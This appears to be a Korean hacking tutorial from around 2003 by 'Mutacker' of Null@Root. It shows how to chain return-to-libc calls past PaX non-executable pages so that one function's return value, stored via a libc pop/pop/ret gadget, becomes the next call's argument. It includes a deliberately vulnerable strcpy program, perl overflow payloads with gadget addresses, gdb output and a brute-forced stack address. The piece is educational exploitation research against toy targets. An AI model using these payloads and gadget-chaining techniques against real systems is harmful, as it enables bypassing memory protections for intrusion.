@@ -1,0 +1,379 @@
+               Return-to-Lib 기법을 이용시 함수의 리턴값을 다음 호출 함수에 전달하기
+             
+                                     Mutacker in (주서식지: Null@Root & 항공대 네트웍 보안연구실 )
+                                                  mutacker@null2root.org, 
+                                                  mutacker@mail.hangkong.ac.kr
+                                                  (http://mutacker.null2root.org)
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+/////// 1. 글 쓰기에 앞서
+
+먼저 글 쓰기에 앞서 항상 저를 도와주시는 많은 분들에게 감사드립니다.
+이하 존칭 생략.. 죄송합니다. __)
+
+해킹의 새로운 기술이나 기법을 발견하고 생각해 내는 작업은 분명 혼자서 해나가기에는 지치고 힘이 들 때가 많다. 
+하지만, 항상 곁에서 지켜봐주고, 도와주고 조언을 아끼지 않는 수많은 분들이 있기에 가능한 일이 아닌가 싶다.
+다시 한번 그 분들에게 감사를 표한다.
+
+특히, 우리의 "오~ 모나리자(O~ MuNaRiSe)"팀원(?)들께 감사드립니다. - 정체불명의 Null@Root 멤버들
+
+이 문서는 다양한 방법의 소개에 해당하는 것으로 버퍼오버플로어 기법이 어디까지 응용이 가능한지 보여주기 위함일 
+뿐이다.
+
+본 문서에 대한 판권은 없는 것으로 하며, 단지 편집만은 금했으면 한다.
+틀린 부분이나 오탈자 등은 본인에게 메일이나 주서식지(irc.null2root.org)에서 알려주시기 바랍니다.
+단지 본 문서에서는 방향만을 제시할 뿐 실제 특정 어플리케이션에 관련된 exploit을 제공하지는 않는다.
+아무쪼록, 이 글이 한국 보안 전문가들이나 열심히 노력하는(? 뚫기위해가 아닌 기술발전을 위해) 해커들에게,
+그리고 프로그램을 개발하는 개발자들에게 조그마한 도움이 되었으면 하는 바램에서 글을 적어본다.
+
+이 문서의 최고 공개지는 http://www.null2root.org이며, 최초 문서 개제 장소는 http://www.khdp.org이다.
+만일 다른 곳에 본 문서를 개제할 경우에는 그 출처를 정확히 밝혀주었으면 하는 바램이다.
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+/////// 2. 소개
+
++--------------------------------------------------------------------------------------------------------+
+| "Return-to-Lib 기법을 이용할 때, 이전에 실행시킨 함수의 결과값을 다음 함수의 인자로 넘겨줄 수 없을까?" |
++--------------------------------------------------------------------------------------------------------+
+
+오메가 프로젝트를 시작으로 상당히 많은 주제로 쉘코드를 사용하지 않고 쉘을 실행시키는 방법들이 공개가 되어졌다.
+하지만, 이들 문서들에서는 함수의 리턴값을 다음 함수에 전달하는 방법에 대해서는 소개되지 못하고 있다.
+즉, 바인드 쉘과 같은 이전에 실행된 함수의 리턴값을 받아서 다음 함수의 인자값으로 넘겨주어야 하는 경우에 대한 
+해결방안이 없어 일반적인 쉘을 실행시키는데에만 그쳐왔다. 
+
+본 문서에서는 stack buffer overflow가 발생하는 환경하에서 Return-to-Lib(이하 RTL) 기법을 이용하려고 할 때 리턴값을 
+다음 함수의 매개 인자값으로 전달하는 방법을 소개하려고 한다.
+
+이전에 작성하였던 문서인 "Stack buffer overflow기법을 이용하여 Text영역에 쉘코드를 올려놓고 실행시키기"과 
+비교하여 읽어볼 것을 권한다.
+
+-- 설정 환경
+(1) 시스템과 운영체제
+mutacker ~/newdoc> uname -a
+Linux kof 2.4.20-PaX #2 SMP Sat Feb 22 06:59:22 KST 2003 i686 unknown
+
+(2) PaX patch 설정 환경
+http://pageexec.virtualave.net 의 PaX patch 적용
+[*] Paging based non-executable pages
+[ ] Segmentation based non-executable pages
+[ ]   Emulate trampolines
+[ ]   Restrict mprotect()
+[ ]     Disallow ELF text relocations
+[ ] Address Space Layout Randomization
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 3. 문제 설정
+
+//  print(add()); 를 호출한 효과를 BoF를 이용하여 수행하라.
+#include <stdio.h>
+
+int add() {
+        return 100;
+}
+
+int print(int num) {
+        printf("Good Job : %d\n", num);
+}
+
+int main(int argc, char* argv[]) {
+        char buf[32];
+
+        strcpy(buf, argv[1]);
+        printf("buf: %s\n", buf);
+}
+
+
+위의 문제를 보면 print()함수의 매개변수로 add()함수의 리턴값을 받아서 처리하는 것이 문제이다.
+즉, 이전에 우리가 알고 있던 Return-to-Lib 기법만으로는 add()함수의 리턴값을 획득할 수 있는 방안이 없으므로, 
+이를 해결할 방법을 찾는 것이 중요하겠다.
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 4. 문제 분석과 실마리
+
+하나의 함수가 또 다른 함수를 호출 했을 경우, 리턴값을 호출한 함수 측에 전달하게 될까?
+이 질문에 대한 답은 %eax 레지스터에 결과값을 되돌려 준다는 것이다.
+
+이를 조그마한 프로그램을 통해 확인해 보도록 하자.
+
+mutacker ~/newdoc> cat rettest.c
+int add(int a, int b) {
+        return a+b;
+}
+
+main() {
+        int c;
+
+        c = add( 100, 200 );
+        printf("Number : %d\n", c);
+}
+
+mutacker ~/newdoc> objdump -d rettest
+
+.....
+
+08048470 <main>:
+8048470:       55                      push   %ebp
+8048471:       89 e5                   mov    %esp,%ebp
+8048473:       83 ec 08                sub    $0x8,%esp
+8048476:       83 ec 08                sub    $0x8,%esp
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+8048479:       68 c8 00 00 00          push   $0xc8
+804847e:       6a 64                   push   $0x64
+8048480:       e8 db ff ff ff          call   8048460 <add>
+8048485:       83 c4 10                add    $0x10,%esp
+8048488:       89 c0                   mov    %eax,%eax
+804848a:       89 45 fc                mov    %eax,0xfffffffc(%ebp)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+804848d:       83 ec 08                sub    $0x8,%esp
+8048490:       ff 75 fc                pushl  0xfffffffc(%ebp)
+8048493:       68 18 85 04 08          push   $0x8048518
+8048498:       e8 9f fe ff ff          call   804833c <_init+0x58>
+804849d:       83 c4 10                add    $0x10,%esp
+80484a0:       c9                      leave
+80484a1:       c3                      ret
+
+.....
+
+위에서 ~~~과 ~~~ 사이 부분이 바로 c = add(100, 200);에 해당하는 부분으로 함수 호출이 끝난 후  
+     804848a:       89 45 fc                mov    %eax,0xfffffffc(%ebp)
+이 부분에서 리턴값(%eax레지스터)이 c에 해당하는 부분인 0xfffffffc(%ebp)에 저장되어지고 있음을 알 수 있다.
+
+자! 우리는 함수의 리턴값이 %eax레지스터를 통해 전달되어진다는 것을 알았다.
+
+그렇다면, Return-to-Lib를 통해 호출한 함수의 리턴값도 동일한 방법으로 전달되어질 것이라는 것을 예상할 수 있다.
+여기까지 읽으신 분이라면 %eax레지스터의 내용을 이용하면 되겠다는 것을 아실 것이다.
+그렇다면, 쉘코드가 아닌 RTL기법을 이용할 경우 %eax의 값을 어떻게 획득할 것인가와 어떻게 다음 함수의 매개변수로 
+넘겨줄 것인가가 문제가 되겠다.
+
+이를 위해 먼저 해당 프로그램을 분석을 약간 해보도록 하자.
+
+mutacker ~/newdoc> gcc -o newdoc newdoc.c
+mutacker ~/newdoc> ldd newdoc
+        libc.so.6 => /lib/i686/libc.so.6 (0x40022000)
+        /lib/ld-linux.so.2 => /lib/ld-linux.so.2 (0x40000000)
+
+위의 상황을 보면 해당 프로세스가 로드되어 질 때, 두개의 공유라이브러리가 같이 적재되어질 것이라는 것을 알 수 있다.
+
+    +-----------------------------------------------------------------------------------------+
+    | "%eax 레지스터의 내용을 스택 메모리 공간으로 저장하는 코드가 라이브러리 안에 존재할까?" |
+    +-----------------------------------------------------------------------------------------+
+
+만일 위의 주제와 같은 코드만 존재한다면 함수를 호출하고 바로 다음 부분에 %eax레지스터의 내용을 우리가 원하는 메모리 
+공간으로 이동시키는 코드를 실행 시키면 원하는 작업을 수행할 수 있을 것이다.
+
+이를 위해 라이브러리를 objdump를 이용하여 내용을 살펴보자.
+
+mutacker ~/newdoc> objdump -d /lib/i686/libc.so.6
+....
+
+00026bd0 <_nl_postload_time>:
+   26bd0:        55                           push   %ebp
+   26bd1:        89 e5                        mov    %esp,%ebp
+   26bd3:        53                           push   %ebx
+   26bd4:        e8 07 fa ff ff               call   265e0 <_nl_postload_ctype+0xcc>
+   26bd9:        81 c3 0b 3e 10 00            add    $0x103e0b,%ebx
+   26bdf:        31 c9                        xor    %ecx,%ecx
+   26be1:        31 d2                        xor    %edx,%edx
+   26be3:        89 8b 1c 0d 00 00            mov    %ecx,0xd1c(%ebx)
+   26be9:        31 c0                        xor    %eax,%eax
+   26beb:        89 93 28 0d 00 00            mov    %edx,0xd28(%ebx)
+   26bf1:        89 83 30 0d 00 00            mov    %eax,0xd30(%ebx)
+   26bf7:        5b                           pop    %ebx
+   26bf8:        5d                           pop    %ebp
+   26bf9:        c3                           ret    
+....
+
+mutacker ~/newdoc> objdump -d /lib/ld-linux.so.2
+....
+
+(gdb) disassemble _nl_postload_time
+Dump of assembler code for function _nl_postload_time:
+0x40048bd0 <_nl_postload_time>: push   %ebp
+0x40048bd1 <_nl_postload_time+1>:       mov    %esp,%ebp
+0x40048bd3 <_nl_postload_time+3>:       push   %ebx
+0x40048bd4 <_nl_postload_time+4>:       call   0x400485e0 <_nl_postload_ctype+204>
+0x40048bd9 <_nl_postload_time+9>:       add    $0x103e0b,%ebx
+0x40048bdf <_nl_postload_time+15>:      xor    %ecx,%ecx
+0x40048be1 <_nl_postload_time+17>:      xor    %edx,%edx
+0x40048be3 <_nl_postload_time+19>:      mov    %ecx,0xd1c(%ebx)
+0x40048be9 <_nl_postload_time+25>:      xor    %eax,%eax
+0x40048beb <_nl_postload_time+27>:      mov    %edx,0xd28(%ebx)
+0x40048bf1 <_nl_postload_time+33>:      mov    %eax,0xd30(%ebx)
+0x40048bf7 <_nl_postload_time+39>:      pop    %ebx
+0x40048bf8 <_nl_postload_time+40>:      pop    %ebp
+0x40048bf9 <_nl_postload_time+41>:      ret
+End of assembler dump.
+
+위에 보인 것은 _nl_postload_time 라이브러리 함수의 내용을 보인 것으로 (눈이 빨게지도록 찾았다 -_-)
+우리에게 필요한 부분은 아래의 부분에 해당한다.
+
+   26bf1:        89 83 30 0d 00 00            mov    %eax,0xd30(%ebx)  -- (1)
+   26bf7:        5b                           pop    %ebx              -- (2)  
+   26bf8:        5d                           pop    %ebp              -- (3)
+   26bf9:        c3                           ret                      -- (4)
+
+(1)은 %eax레지스터의 내용을 %ebx레지스터가 가리키는 곳으로부터 0xd30에 해당하는 곳에 저장하는 부분이다.
+만일 %ebx의 값이 0xbffff2c0 라면 0xd30인 위치에 저장되므로 0xbffffff0라는 주소에 %eax 레지스터의 내용을 
+저장할 수 있다는 의미가 되겠다.
+헌데, 문제는 %ebx의 내용은 어떻게 바꿀 것인가? 그 답은 바로 (2)에 있다. 
+(2)는 스택상의 %esp가 가리키는 곳의 내용을 %ebx에 넣으라는 명령이다.
+우리가 %esp값만 조정을 잘 할 수 있다면, 특정 메모리 위치에 0xbffff2c0과 같은 자신이 원하는 메모리 주소값을 
+넣어두고 (2)가 실행되면 %ebx레지스터에 원하는 값을 넣어둘 수 있는 것이다.
+
+일단 실행의 흐름은 (2)가 먼저 실행되고 (1)이 실행되어야 하지만, 이를 통제할 방법이이 RTL을 이용할 경우에는
+존재하지 않기 때문에, (2), (3), (4)를 순서대로 실행하고, 다시 (1), (2), (3), (4)를 실행시키면 되겠다.
+
+전체적인 프로그램의 흐름은 
+   26bf7:        5b                           pop    %ebx              -- (2)  
+   26bf8:        5d                           pop    %ebp              -- (3)
+   26bf9:        c3                           ret                      -- (4)
+   26bf1:        89 83 30 0d 00 00            mov    %eax,0xd30(%ebx)  -- (1)'
+   26bf7:        5b                           pop    %ebx              -- (2)' 
+   26bf8:        5d                           pop    %ebp              -- (3)'
+   26bf9:        c3                           ret                      -- (4)'
+이런 순서가 되겠다.
+
+(4)에서 리턴 주소를 (1)'로 줌으로써 그 흐름을 조정할 수 있으므로 큰 걱정거리는 되지 않을 것이다.
+
+그러면 위의 상황을 위해서 스택은 어떻게 꾸며질까?
+pop명령어와 ret명령어 모두 실행후 %esp 레지스터가 4씩 증가해 간다.
+즉, pop과 ret에 대해서만 %esp값이 변경되므로 그에 대해 스택상에 값을 적절히 넣어두면 되겠다.
+따라서, 스택구성을 아래와 같이 해두면 우리가 원하는 곳에 %eax의 값을 저장할 수 있을 것이다.
+
+             |                                 |
+             +---------------------------------+
+             | %eax의 값이 저장될 주소 - 0xd30 | <- pop  %ebx : 여기 설정값이 %ebx에 저장됨
+             +---------------------------------+
+             |    %ebp의 값 (중요하지 않음)    | <- pop  %ebp : 여기 설정값이 %ebp에 저장됨
+             +---------------------------------+
+             |(1)'의 메모리 주소값(0x40048bf1) | <- ret 을 위해
+             +---------------------------------+
+             |    %ebx의 값 (중요하지 않음)    | <- pop  %ebx : 여기 설정값이 %ebx에 저장됨
+             +---------------------------------+
+             | %ebp의 값 (다음 leave chain 값) | <- pop  %ebp : 여기 설정값이 %ebp에 저장됨
+             +---------------------------------+
+             |   이후의 코드에 해당하는 주소   | <- ret 을 위해
+             +---------------------------------+
+             |                                 |
+
+우리는 일단 라이브러리 내에 있는 특정 코드를 이용하여 %eax의 값을 특정 메모리로 저장할 수있는 방법에 대해 살펴보았다.
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 5. 실험과 실험 사이 :)
+
+
+그러면 먼저 위의 문제를 약간 변형하여 특정 메모리 번지에 %eax값이 저장이 되어지는가를 확인을 해보도록 하자.
+이를 위해 오하라님의 dumpcode를 이용하도록 하겠다.
+
+mutacker ~/newdoc> cat tnewdoc.c
+
+#include <stdio.h>
+#include "dumpcode.h"
+
+int add() {
+        return 100;
+}
+
+int print(int num) {
+        printf("%d\n", num);
+}
+
+int main(int argc, char* argv[]) {
+        char buf[32];
+
+        strcpy(buf, argv[1]);
+        printf("buf: %s\n", buf);
+        dumpcode((char*)0xbffffff0, 16);
+}
+
+void test() {
+        dumpcode((char*)0xbffffff0, 16);
+}
+
+mutacker ~/newdoc> objdump -d ./tnewdoc | grep "<add>"
+08048704 <add>:
+mutacker ~/newdoc> objdump -d ./tnewdoc | grep "<test>"
+08048774 <test>:
+
+가장 먼저 우리는 BoF의 return address를 add의 시작주소인 0x08048704으로 설정하고, 위에서 언급한 방식의 스택프레임을 구성하고, 
+마지막에 해당 메모리가 변경이 되어졌는지를 확인하기 위해 test가 실행이 되도록 할 것이다. 
+
+mutacker ~/newdoc> ./tnewdoc `perl -e 'print "A"x44, "\x04\x87\x04\x08", "\xf7\x8b\x04\x40", "\xc0\xf2\xff\xbf"x2, "\xf1\x8b\x04\x40", "\x74\x87\x04\x08"x3'`
+buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA??@쟌&#65533;오?욺?@t?  t?t?
+
+0xbffffff0  63 00 2e 2f 74 6e 65 77 64 6f 63 00 00 00 00 00   c../tnewdoc.....
+            ~~~~~~~~~~~ 
+
+0xbffffff0  64 00 00 00 74 6e 65 77 64 6f 63 00 00 00 00 00   d...tnewdoc.....
+            ~~~~~~~~~~~
+Segmentation fault (core dumped)
+mutacker ~/newdoc> 
+
+와우!! 우리가 지정한 주소에 값이 변경되어 있음을 확인할 수있다.
+"\xc0\xf2\xff\xbf" ==> 0xbffff2c0 == 0xbffffff0 - 0xd30 
+0x00000064 == 100
+
+우리는 여기에서 test함수의 주소 대신 print의 시작주소를 넣어보자. 그리고, print의 시작주소가 들어간 곳 + 4의 위치에 매개변수가 들어갈 것이며, 
+이곳의 주소값을 "\xc0\xf2\xff\xbf" 이 부분에 대체하면 될 것이다.
+
+자!! 본 프로그램을 이용하여 테스트를 해보자.
+
+mutacker ~/newdoc> objdump -d ./newdoc | grep "<add>"
+08048490 <add>:
+mutacker ~/newdoc> objdump -d ./newdoc | grep "<print>"
+0804849c <print>:
+
+mutacker ~/newdoc> ./newdoc `perl -e 'print "A"x44, "\x90\x84\x04\x08", "\xf7\x8b\x04\x40", "\xc0\xf2\xff\xbf"x2, "\xf1\x8b\x04\x40", "\xaa\xaa\xaa\xaa", "\xbb\xbb\xbb\xbb", "\x9c\x84\x04\x08", "XXXX", "YYYY"'`
+buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA릢?@쟌&#65533;오?욺?@おお뻣뻣쐞
+Good Job : 0
+Segmentation fault (core dumped)
+
+mutacker ~/newdoc> gdb newdoc core -q
+Core was generated by `./newdoc AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA릢?@쟌&#65533;오?욺
+?@おお뻣'.
+Program terminated with signal 11, Segmentation fault.
+Reading symbols from /lib/i686/libc.so.6...done.
+Loaded symbols for /lib/i686/libc.so.6
+Reading symbols from /lib/ld-linux.so.2...done.
+Loaded symbols for /lib/ld-linux.so.2
+#0  0x4003e11c in __libc_start_main (main=Cannot access memory at address 0xbbbbbbc3
+) at ../sysdeps/generic/libc-start.c:77
+77      ../sysdeps/generic/libc-start.c: No such file or directory.
+        in ../sysdeps/generic/libc-start.c
+(gdb) info reg $ebx $ebp
+ebx            0xaaaaaaaa       -1431655766
+ebp            0xbbbbbbbb       0xbbbbbbbb
+
+위의 gdb를 이용한 레지스터의 내용을 살펴보면 우리가 실행시킨 코드에 의해 ebx와 ebp값이 변경되어 있음을 확인할 수 있다.
+
+위의 입력부분에서 "YYYY"에 해당하는 스택상의 주소값을 알아내는 것이 중요하지만, 여기에서는 brute force방법을 이용하도록 하겠다.
+
+mutacker ~/newdoc> ./newdoc `perl -e 'print "A"x44, "\x90\x84\x04\x08", "\xf7\x8b\x04\x40", "\xf0\xee\xff\xbf"x2, "\xf1\x8b\x04\x40", "\xaa\xaa\xaa\xaa", "\xbb\xbb\xbb\xbb", "\x9c\x84\x04\x08", "XXXX", "YYYY"'`
+buf: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA릢?@尊&#65533;욹?욺?@おお뻣뻣쐞 XXXXYYYY
+Good Job : 100
+Segmentation fault (core dumped)
+mutacker ~/newdoc>
+
+위에서 print를 위한 매개변수 위치가 0xbffffc20 이었으며, 0xd30만큼을 뺀 수가 설정되어야 하기 때문에 0xbfffeef0을 입력하였다.
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 5. 결론
+
+본 문서에서는 Return-to-Lib 기법을 이용할 때, 함수의 리턴값을 다음 함수의 매개변수로 설정하는 방법을 보이고 있다.
+이를 통해 Return-to-Lib 기법을 이용하여 바인드 쉘코드나 이와 유사한 함수의 리턴값을 받아 다음 함수가 수행되어지는데 
+필수적인 사항에 대한 처리도 가능함을 보였다.
+
+다음 문서에서는 이를 이용한 하나의 응용을 보이도록 하겠다. :)
+이 문서가 내 인생의 총각으로서 쓰는 마지막 문서가 될지로 모르겠다. :)
+그럼 여러분들의 건승을 빌면서.. 
+
+
+///////////////////////////////////////////////////////////////////////////////////////////////
+////// 6. 참고문서
+
+1. Stack buffer overflow기법을 이용하여 Text영역에 쉘코드를 올려놓고 실행쳔갚?: http://www.kof.co.kr/breakpax.txt
+2. The advanced return-into-lib(c) exploits : phrack 58-4
+3. 기타 수많은 bof글들 ^^
+
